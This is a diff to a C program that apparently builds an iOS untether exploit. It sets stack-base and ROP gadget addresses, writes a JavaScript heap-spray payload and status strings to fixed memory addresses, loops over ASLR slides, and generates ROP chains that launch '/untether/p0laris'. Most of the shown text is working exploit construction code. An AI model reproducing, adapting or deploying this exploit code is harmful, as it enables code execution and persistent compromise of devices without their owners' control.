@@ -176,7 +176,8 @@ int main(int   argc,
 //	uint32_t	stack_base					= 0x1c7738; // my shell setup
 //	uint32_t	stack_base					= 0x1c7c88; // my 4s shell setup
 //	uint32_t	stack_base					= 0x1c2e48; // my lldb
-	uint32_t	stack_base					= 0x1c7d68; // btserver env
+//	uint32_t	stack_base					= 0x1c7d68; // btserver env
+	uint32_t	stack_base					= 0x1c7dd8; // wifiFirmwareLoader env
 	uint32_t	magic_trigger_addr			= 0xb6074;
 
 	uint32_t	mov_r0_0_bx_lr				= 0x8d3e	| 1;
@@ -297,6 +298,39 @@ int main(int   argc,
 			write32_unslid(0x41414141,
 						   0x42424242));
 #endif
+								
+	fprintf(fp,
+			"%s",
+			writebuf_unslid(0x108000,
+							"var parent = new Uint8Array(0x100);"
+							"var child = new Uint8Array(0x100);"
+							"    var fuck = new Array();"
+							"    for (var i = 0; i < 0x200000; i++) {"
+							"        fuck[i] = i;"
+							"    }"
+							"    delete fuck;"
+							""
+							"//shitalloc();",
+							strlen("var parent = new Uint8Array(0x100);"
+								   "var child = new Uint8Array(0x100);"
+								   "    var fuck = new Array();"
+								   "    for (var i = 0; i < 0x200000; i++) {"
+								   "        fuck[i] = i;"
+								   "    }"
+								   "    delete fuck;"
+								   ""
+								   "//shitalloc();") + 1));
+	fprintf(fp,
+			"%s",
+			writebuf_unslid(0x10a000,
+							js_src,
+							strlen(js_src) + 1));
+	
+	fprintf(fp,
+			"%s",
+			writebuf_unslid(0x109000,
+							"still alive\n",
+							strlen("still alive\n") + 1));
 
 	for (int slide = 0x1; slide <= 0x3; slide++) {
 		uint32_t base = slide << 12;
@@ -320,30 +354,6 @@ int main(int   argc,
 								"[*] malloc(...)\t\t\t= %p\n",
 								strlen("[*] malloc(...)\t\t\t= %p\n") + 1));
 
-
-		fprintf(fp,
-				"%s",
-				writebuf_unslid(base + dyld_status_addr,
-								"[*] dyld_base\t\t\t= %p\n",
-								strlen("[*] dyld_base\t\t\t= %p\n") + 1));
-
-		fprintf(fp,
-				"%s",
-				writebuf_unslid(base + dyld_status2_addr,
-								"[*] *(uint32_t*)dyld_base\t= %p\n",
-								strlen("[*] *(uint32_t*)dyld_base\t= %p\n") + 1));
-
-		fprintf(fp,
-				"%s",
-				writebuf_unslid(base + jsc_addr,
-								"/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore",
-								strlen("/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore") + 1));
-
-		fprintf(fp,
-				"%s",
-				writebuf_unslid(base + dlopen_status_addr,
-								"[*] dlopen(JavaScriptCore)\t= %p\n",
-								strlen("[*] dlopen(JavaScriptCore)\t= %p\n") + 1));
 		fprintf(fp,
 				"%s",
 				writebuf_unslid(base + dyld_shc_status_addr,
@@ -359,40 +369,6 @@ int main(int   argc,
 				writebuf_unslid(base + arg_addr,
 								"/untether/p0laris",
 								strlen("/untether/p0laris") + 1));
-								
-		fprintf(fp,
-				"%s",
-				writebuf_unslid(0x108000,
-								"var parent = new Uint8Array(0x100);"
-								"var child = new Uint8Array(0x100);"
-								"    var fuck = new Array();"
-								"    for (var i = 0; i < 0x800000; i++) {"
-								"        fuck[i] = i;"
-								"    }"
-								"    delete fuck;"
-								""
-								"//shitalloc();",
-								strlen("var parent = new Uint8Array(0x100);"
-									   "var child = new Uint8Array(0x100);"
-									   "    var fuck = new Array();"
-									   "    for (var i = 0; i < 0x800000; i++) {"
-									   "        fuck[i] = i;"
-									   "    }"
-									   "    delete fuck;"
-									   ""
-									   "//shitalloc();") + 1));
-		fprintf(fp,
-				"%s",
-				writebuf_unslid(0x10a000,
-								js_src,
-								strlen(js_src) + 1));
-
-		fprintf(fp,
-				"%s",
-				writebuf_unslid(0x109000,
-								"still alive\n",
-								strlen("still alive\n") + 1));
-								
 
 		rop_chain_shit	chain_b0i	= gen_rop_chain(base,
 													we_out_here_addr,
